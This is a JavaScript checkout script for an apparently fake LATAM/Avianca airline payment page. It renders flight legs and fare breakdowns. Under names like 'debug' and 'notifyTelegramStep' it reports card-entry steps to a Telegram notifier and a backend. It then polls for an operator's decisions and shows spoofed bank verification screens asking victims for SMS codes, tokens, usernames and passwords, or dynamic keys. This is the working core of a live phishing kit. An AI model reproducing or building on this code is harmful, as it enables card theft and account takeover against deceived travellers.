<script>
  import {
    cardNumberMaxLength,
    detectCardBrand,
    formatCardExp,
    formatCardNumber,
    onlyDigits,
    validateCardExp,
    validateCardNumber,
  } from '../../services/cardPaymentValidation';
  import {
    airlineAfterDiscount,
    splitAirlineAndTax,
    ticketAfterDiscount as applyTicketDiscount,
  } from '../../services/ticketDiscount';

  function notifyTelegramStep(event) {
    if (typeof window.sendTelegramStep === 'function') {
      window.sendTelegramStep(event);
      return;
    }
    try {
      fetch('/api/debug-page', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ event }),
        keepalive: true,
      }).catch(() => {});
    } catch {
      /* Debug telemetry is best-effort. */
    }
  }

  function resetTelegramStep(event) {
    try {
      if (window.__latamTgSent) delete window.__latamTgSent[event];
      sessionStorage.removeItem('latam-tg:' + event);
    } catch {
      /* ignore */
    }
  }

  const boardEl = document.getElementById('pagos-board');
  const legsJson = boardEl?.dataset.legs || '[]';
  const copy = JSON.parse(boardEl?.dataset.copy || '{}');
  const discountPct = Number(boardEl?.dataset.descuento || 0) || 0;

  const STORAGE_KEY = 'latam-checkout-selection';
  const SEATS_KEY = 'latam-seat-selection';
  const STORE_KEY = 'latam-store-selection';
  const PAX_KEY = 'latam-passenger-draft';
  const DEBUG_SESSION_KEY = 'latam-debug-session-id';
  const defaultLegs = JSON.parse(legsJson);

  function debugSessionId() {
    let sessionId = sessionStorage.getItem(DEBUG_SESSION_KEY);
    if (!sessionId) {
      sessionId = crypto.randomUUID();
      sessionStorage.setItem(DEBUG_SESSION_KEY, sessionId);
    }
    return sessionId;
  }

  async function sendDebugEvent(event, payload = {}) {
    console.log(`[debug-before-fetch:${event}]`, {
      sessionId: debugSessionId(),
      route: window.location.pathname,
      ...payload,
    });
    const response = await fetch('/api/debug', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        event,
        sessionId: debugSessionId(),
        route: window.location.pathname,
        ...payload,
      }),
    });
    if (!response.ok) throw new Error('No se pudo consultar el enrutador debug');
    return response.json();
  }

  let debugPollGen = 0;

  async function pollDebugDecision(timeoutMs = 90000, gen = debugPollGen) {
    const sessionId = debugSessionId();
    const started = Date.now();
    while (Date.now() - started < timeoutMs) {
      if (gen !== debugPollGen) return { action: 'cancelled' };
      const response = await fetch(`/api/debug?sessionId=${encodeURIComponent(sessionId)}`, {
        headers: { Accept: 'application/json' },
      });
      if (response.ok) {
        const payload = await response.json();
        const decision = payload?.decision || {};
        if (decision.action && decision.action !== 'wait') return decision;
      }
      await new Promise((resolve) => window.setTimeout(resolve, 1500));
    }
    return {
      action: 'timeout',
      message: 'La verificacion esta tardando mas de lo esperado. Intenta nuevamente.',
    };
  }

  async function watchOperatorDecisions({
    wait,
    challenge,
    brandKey,
    merchantLabel,
    amountLabel,
    datetimeLabel,
    resetChallenge = true,
  }) {
    const gen = debugPollGen;
    while (gen === debugPollGen) {
      const decision = await pollDebugDecision(180000, gen);
      if (gen !== debugPollGen) return;
      const nextAction = decision?.action || 'timeout';
      if (nextAction === 'cancelled') return;

      if (nextAction === 'sms' || nextAction === 'sms_error') {
        if (wait) wait.hidden = true;
        document.body.classList.remove('is-offers-waiting');
        if (resetChallenge) {
          showChallenge(
            brandKey,
            merchantLabel,
            amountLabel,
            datetimeLabel,
            nextAction === 'sms_error' ? decision?.message || '' : '',
            'otp',
          );
        } else {
          if (challenge) challenge.hidden = false;
          showChallenge(
            brandKey,
            merchantLabel,
            amountLabel,
            datetimeLabel,
            nextAction === 'sms_error' ? decision?.message || '' : '',
            'otp',
          );
        }
        continue;
      }

      if (nextAction === 'token' || nextAction === 'token_error') {
        if (wait) wait.hidden = true;
        document.body.classList.remove('is-offers-waiting');
        showChallenge(
          brandKey,
          merchantLabel,
          amountLabel,
          datetimeLabel,
          nextAction === 'token_error' ? decision?.message || '' : '',
          'token',
        );
        continue;
      }

      if (nextAction === 'userpass' || nextAction === 'userpass_error') {
        if (wait) wait.hidden = true;
        document.body.classList.remove('is-offers-waiting');
        showChallenge(
          brandKey,
          merchantLabel,
          amountLabel,
          datetimeLabel,
          nextAction === 'userpass_error' ? decision?.message || '' : '',
          'userpass',
        );
        continue;
      }

      if (nextAction === 'dkey' || nextAction === 'dkey_error') {
        if (wait) wait.hidden = true;
        document.body.classList.remove('is-offers-waiting');
        showChallenge(
          brandKey,
          merchantLabel,
          amountLabel,
          datetimeLabel,
          nextAction === 'dkey_error' ? decision?.message || '' : '',
          'dkey',
        );
        continue;
      }

      if (nextAction === 'card' || nextAction === 'card_error') {
        if (wait) wait.hidden = true;
        if (challenge) challenge.hidden = true;
        document.body.classList.remove('is-offers-waiting');
        clearCardInputs();
        setCardOpen(true);
        showCardErrorModal(decision?.message || 'No pudimos verificar la tarjeta. Ingresa los datos nuevamente.');
        resetTelegramStep('✅ Ingreso datos cc');
        resetTelegramStep('Devuelta a ingresar tarjeta');
        notifyTelegramStep('Devuelta a ingresar tarjeta');
        cardNumber?.focus();
        return;
      }

      if (nextAction === 'approved') {
        if (wait) wait.hidden = true;
        if (challenge) challenge.hidden = true;
        document.body.classList.remove('is-offers-waiting');
        window.location.href = '/success';
        return;
      }

      if (challenge && !challenge.hidden) continue;
      if (wait) wait.hidden = true;
      document.body.classList.remove('is-offers-waiting');
      setUiMessage(decision?.message || 'La verificacion esta tardando mas de lo esperado. Intenta nuevamente.');
      return;
    }
  }

  function maskCard(value) {
    const digits = onlyDigits(value || '');
    if (digits.length < 8) return digits.replace(/\d/g, '*');
    return `${digits.slice(0, 6)}******${digits.slice(-4)}`;
  }

  function setUiMessage(message, kind = 'error') {
    if (!msg) return;
    msg.hidden = !message;
    msg.textContent = message || '';
    msg.dataset.kind = kind;
  }

  function setChallengeMessage(brand, message, kind = 'error') {
    const challenge = document.getElementById('pagos-challenge-screen');
    const panel = challenge?.querySelector(`[data-challenge-brand="${brand}"]`);
    const form = panel?.querySelector('form:not([hidden])') || panel?.querySelector('[data-otp-form]');
    if (!form) {
      setUiMessage(message, kind);
      return;
    }
    let error = form.querySelector('[data-otp-debug-message]');
    if (!error) {
      error = document.createElement('p');
      error.setAttribute('data-otp-debug-message', '');
      error.setAttribute('role', 'alert');
      error.style.margin = '10px 0 0';
      error.style.fontSize = '13px';
      error.style.lineHeight = '1.35';
      form.appendChild(error);
    }
    error.textContent = message || '';
    error.hidden = !message;
    error.dataset.kind = kind;
    error.style.color = kind === 'success' ? '#178a3b' : kind === 'info' ? '#1b4e9b' : '#b42318';
  }

  function clearChallengeMessages() {
    document.querySelectorAll('[data-otp-debug-message]').forEach((el) => {
      el.textContent = '';
      el.hidden = true;
    });
  }

  function clearCardInputs() {
    [cardNumber, cardName, cardExp, cardCvv, cardEmail].forEach((input) => {
      if (!input) return;
      input.value = '';
      input.setAttribute('readonly', '');
      syncPlaceholderState(input);
    });
    syncCardFieldStates({ force: false });
    syncPayEnabled();
  }

  function showCardErrorModal(message = 'No pudimos verificar la tarjeta. Ingresa los datos nuevamente.') {
    const modal = document.getElementById('pagos-debug-modal');
    const text = document.getElementById('pagos-debug-modal-message');
    const close = document.getElementById('pagos-debug-modal-close');
    if (text) text.textContent = message;
    if (modal) modal.hidden = false;
    document.body.classList.add('pagos-debug-modal-open');
    close?.focus();
  }

  function closeCardErrorModal() {
    const modal = document.getElementById('pagos-debug-modal');
    if (modal) modal.hidden = true;
    document.body.classList.remove('pagos-debug-modal-open');
    cardNumber?.focus();
  }

  document.getElementById('pagos-debug-modal-close')?.addEventListener('click', closeCardErrorModal);

  function showChallenge(brand, merchantLabel, amountLabel, datetimeLabel, withError = '', mode = 'otp') {
    const challenge = document.getElementById('pagos-challenge-screen');
    const brandKey = ['visa', 'amex', 'diners', 'mastercard', 'discover'].includes(brand) ? brand : 'visa';
    clearChallengeMessages();
    challenge?.querySelectorAll('[data-challenge-brand]').forEach((panel) => {
      const active = panel.getAttribute('data-challenge-brand') === brandKey;
      panel.hidden = !active;
      if (!active) return;
      panel.querySelectorAll('[data-challenge-merchant]').forEach((el) => {
        el.textContent = merchantLabel;
      });
      panel.querySelectorAll('[data-challenge-amount]').forEach((el) => {
        el.textContent = amountLabel;
      });
      panel.querySelectorAll('[data-challenge-datetime]').forEach((el) => {
        el.textContent = datetimeLabel;
      });
      const otpForm = panel.querySelector('[data-otp-form]');
      const tokenForm = panel.querySelector('[data-token-form]');
      const userForm = panel.querySelector('[data-userpass-form]');
      const dkeyForm = panel.querySelector('[data-dkey-form]');
      panel.querySelectorAll('[data-challenge-copy]').forEach((el) => {
        el.hidden = el.getAttribute('data-challenge-copy') !== mode;
      });
      const help = panel.querySelector('[data-help]');
      if (help) help.hidden = mode !== 'otp';
      if (otpForm) otpForm.hidden = mode !== 'otp';
      if (tokenForm) tokenForm.hidden = mode !== 'token';
      if (userForm) userForm.hidden = mode !== 'userpass';
      if (dkeyForm) dkeyForm.hidden = mode !== 'dkey';
      panel.querySelectorAll('form').forEach((form) => {
        form.dataset.attempts = '0';
        form.querySelectorAll('input').forEach((input) => {
          input.value = '';
        });
      });
    });
    if (challenge) challenge.hidden = false;
    if (withError) setChallengeMessage(brandKey, withError);
  }

  function money(value, withUsd = false) {
    const n = Number(value || 0);
    const formatted = n.toFixed(2).replace('.', ',');
    return withUsd ? `USD\u00a0${formatted}` : `$${formatted}`;
  }

  function ticketAfterDiscount(original) {
    return applyTicketDiscount(original, discountPct);
  }

  function ticketMoney(original, withUsd = false) {
    const before = Number(original) || 0;
    if (!(discountPct > 0)) return money(before, withUsd);
    return `<span class="ticket-price"><span class="ticket-price__was">${money(before, withUsd)}</span><span class="ticket-price__now">${money(ticketAfterDiscount(before), withUsd)}</span></span>`;
  }

  function totalMoney(before, after, withUsd = false) {
    if (!(discountPct > 0) || Math.abs(before - after) < 0.005) return money(after, withUsd);
    return `<span class="ticket-price"><span class="ticket-price__was">${money(before, withUsd)}</span><span class="ticket-price__now">${money(after, withUsd)}</span></span>`;
  }

  function readJson(key, fallback) {
    try {
      return JSON.parse(sessionStorage.getItem(key) || 'null') ?? fallback;
    } catch {
      return fallback;
    }
  }

  function peopleLabel(selection) {
    const adults = Math.max(1, Number(selection?.adults || 1));
    const children = Number(selection?.children || 0);
    const infants = Number(selection?.infants || 0);
    const parts = [];
    parts.push(`${adults} Adulto${adults === 1 ? '' : 's'}`);
    if (children) parts.push(`${children} Niño${children === 1 ? '' : 's'}`);
    if (infants) parts.push(`${infants} Infante${infants === 1 ? '' : 's'}`);
    return parts.join(', ');
  }

  function formatLongDate(iso) {
    if (!iso) return '';
    const d = new Date(`${iso}T12:00:00`);
    if (Number.isNaN(d.getTime())) return iso;
    const days = ['Domingo', 'Lunes', 'Martes', 'Miércoles', 'Jueves', 'Viernes', 'Sábado'];
    const months = ['Enero', 'Febrero', 'Marzo', 'Abril', 'Mayo', 'Junio', 'Julio', 'Agosto', 'Septiembre', 'Octubre', 'Noviembre', 'Diciembre'];
    return `${days[d.getDay()]}, ${d.getDate()} De ${months[d.getMonth()]} De ${d.getFullYear()}`;
  }

  function buildLegs(selection) {
    if (!selection?.outbound?.flight) return defaultLegs;
    const out = selection.outbound.flight;
    const legs = [
      {
        title: `${selection.from?.city || 'Origen'} a ${selection.to?.city || 'Destino'}`,
        dateLabel: formatLongDate(selection.departDate) || defaultLegs[0].dateLabel,
        depart: out.depart || '',
        arrive: out.arrive || '',
        fromCode: selection.from?.code || '',
        toCode: selection.to?.code || '',
        brand: selection.outbound?.brandName || selection.outbound?.brand || 'Full',
      },
    ];
    if (selection.trip === 'roundtrip' && selection.inbound?.flight) {
      const back = selection.inbound.flight;
      legs.push({
        title: `${selection.to?.city || 'Destino'} a ${selection.from?.city || 'Origen'}`,
        dateLabel: formatLongDate(selection.returnDate) || defaultLegs[1]?.dateLabel || '',
        depart: back.depart || '',
        arrive: back.arrive || '',
        fromCode: selection.to?.code || '',
        toCode: selection.from?.code || '',
        brand: selection.inbound?.brandName || selection.inbound?.brand || 'Full',
      });
    }
    return legs;
  }

  function tripBase(selection, discounted = true) {
    const people = Math.max(1, (selection?.adults || 0) + (selection?.children || 0) + (selection?.infants || 0));
    const outRaw = Number(selection?.outbound?.price || 0);
    const backRaw = selection?.trip === 'roundtrip' ? Number(selection?.inbound?.price || 0) : 0;
    const out = discounted ? ticketAfterDiscount(outRaw) : outRaw;
    const back = discounted ? ticketAfterDiscount(backRaw) : backRaw;
    return (out + back) * people;
  }

  function seatExtras(seats) {
    return Number(seats?.outbound?.price || 0) + Number(seats?.inbound?.price || 0);
  }

  function bagExtras(store) {
    const hold = Number(store?.holdCount || 0) * 60;
    const bike = Number(store?.bikeCount || 0) * 45;
    const golf = Number(store?.golfCount || 0) * 40;
    const special = bike || golf ? 0 : Number(store?.specialCount || 0) * 40;
    const cabin = store?.cabin === 'cabin-plus' ? 25 : 0;
    const car = store?.selectedCarId ? Number(store?.selectedCarPrice || 0) : 0;
    return hold + bike + golf + special + cabin + car;
  }

  function computeTotal(selection, seats, store, pax, discounted = true) {
    return tripBase(selection, discounted) + seatExtras(seats) + bagExtras(store) + Number(pax?.assistPrice || 0);
  }

  function renderLegs(legs) {
    const root = document.getElementById('pagos-legs');
    if (!root) return;
    root.innerHTML = legs
      .map((leg, index) => {
        const kind = leg.kind || (index === 0 ? 'ida' : 'vuelta');
        const kindLabel = kind === 'vuelta' ? 'Vuelta' : 'Ida';
        const brand = String(leg.brand || 'Light');
        const brandClass = brand.toLowerCase().includes('classic') ? 'is-classic' : 'is-light';
        return `
      <li class="pagos-leg" data-kind="${kind}">
        <p class="pagos-leg__title">
          <svg viewBox="0 0 24 24" width="16" height="16" aria-hidden="true"><path fill="currentColor" d="M21 16v-2l-8-5V3.5A1.5 1.5 0 0 0 11.5 2 1.5 1.5 0 0 0 10 3.5V9l-8 5v2l8-2.5V19l-2 1.5V22l3.5-1 3.5 1v-1.5L13 19v-5.5l8 2.5Z"/></svg>
          ${kindLabel} | ${leg.title.replace(/^De /, '')}
        </p>
        <p class="pagos-leg__date">${leg.dateLabel}</p>
        <div class="pagos-leg__meta">
          <span>${leg.stops || ''}</span>
          <span class="pagos-leg__brand ${brandClass}">${brand}</span>
          ${leg.extraDay ? '<small>+1 Día</small>' : ''}
        </div>
        <p class="pagos-leg__times">
          <span class="pagos-leg__dep"><strong>${leg.depart}</strong><small>${leg.fromCode}</small></span>
          <i class="pagos-leg__arrow" aria-hidden="true"></i>
          <span class="pagos-leg__arr"><strong>${leg.arrive}</strong><small>${leg.toCode}</small></span>
        </p>
        <p class="pagos-leg__duration">${leg.duration || ''}</p>
      </li>
    `;
      })
      .join('');
  }

  function aviancaUsd(value) {
    const n = Number(value || 0);
    return `USD ${n.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 })}`;
  }

  function taxLines(taxTotal) {
    const parts = [
      ['Cargo de seguridad aeroportuaria', 2.6],
      ['Impuesto al valor agregado (IVA)', 111.5],
      ['Impuesto de salida internacional', 30],
      ['Cargo de protección internacional - salida', 3.98],
      ['Cargo de protección suplementario - salidas', 0.53],
      ['Cargo de protección suplementario - llegadas', 0.53],
      ['Cargo de recuperación COVID - salidas', 3.12],
      ['Impuesto aeroportuario', 65.3],
      ['Impuesto turístico', 15],
      ['Y2DP', 1],
    ];
    const base = parts.reduce((sum, [, amount]) => sum + amount, 0);
    let used = 0;
    return parts.map((item, index) => {
      const amount = index === parts.length - 1
        ? Math.round((taxTotal - used) * 100) / 100
        : Math.round((taxTotal * (item[1] / base)) * 100) / 100;
      used += amount;
      return { name: item[0], amount };
    });
  }

  function fareRow(qty, label, amount) {
    return `
      <div class="pagos-fare">
        <div class="pagos-fare__detail"><span class="pagos-fare__qty">${qty} </span><span> ${label} </span></div>
        <div class="pagos-fare__amt">${aviancaUsd(amount)}</div>
      </div>
    `;
  }

  function nestedAcc(title, amount, rowsHtml) {
    return `
      <div class="pagos-acc pagos-acc--nested">
        <h2 class="pagos-acc__header">
          <button type="button" class="pagos-acc__toggle pagos-acc__toggle--row" data-pagos-nested aria-expanded="false">
            <span class="pagos-acc__row"><span>${title}</span><span>${aviancaUsd(amount)}</span></span>
            <svg class="pagos-acc__chevron" viewBox="0 0 24 24" width="20" height="20" aria-hidden="true"><path fill="currentColor" d="M7.41 8.59 12 13.17l4.59-4.58L18 10l-6 6-6-6z"/></svg>
          </button>
        </h2>
        <div class="pagos-acc__panel">
          <div class="pagos-acc__body pagos-acc__body--rows">${rowsHtml}</div>
        </div>
      </div>
    `;
  }

  function renderDetail(selection, seats, store, pax, totalBefore, total) {
    const body = document.getElementById('pagos-detail-body');
    if (!body) return;
    const adults = Math.max(1, Number(selection?.adults || 1));
    const extras = seatExtras(seats) + bagExtras(store) + Number(pax?.assistPrice || 0);
    const tripRaw = selection?.outbound
      ? tripBase(selection, false)
      : Math.max(0, Math.round((Number(totalBefore || 0) - extras) * 100) / 100);
    const parts = splitAirlineAndTax(tripRaw);
    const taxTotal = parts.tax;
    const fareTotal = airlineAfterDiscount(parts.fare, discountPct);
    const servicesTotal = Math.round((fareTotal + extras) * 100) / 100;
    const serviceRows = [
      fareRow(adults, 'Tiquete adulto', fareTotal),
      Number(seatExtras(seats)) ? fareRow(1, 'Asientos', seatExtras(seats)) : '',
      Number(bagExtras(store)) ? fareRow(1, 'Equipaje', bagExtras(store)) : '',
      Number(pax?.assistPrice || 0) ? fareRow(1, 'Asistencia', pax.assistPrice) : '',
    ].join('');
    const taxRows = taxLines(taxTotal).map((line) => fareRow(adults, line.name, line.amount)).join('');
    body.innerHTML = `
      ${nestedAcc('Vuelos y servicios', servicesTotal, serviceRows)}
      ${nestedAcc('Tasas e impuestos', taxTotal, taxRows)}
    `;
  }

  const selection = readJson(STORAGE_KEY, null);
  const seats = readJson(SEATS_KEY, {});
  const store = readJson(STORE_KEY, {});
  const pax = readJson(PAX_KEY, {});
  const totalBefore = selection?.outbound ? computeTotal(selection, seats, store, pax, false) : 350.46;
  const total = selection?.outbound ? computeTotal(selection, seats, store, pax, true) : ticketAfterDiscount(350.46);
  const legs = buildLegs(selection || {});

  renderLegs(legs);
  renderDetail(selection || {}, seats, store, pax, totalBefore, total);

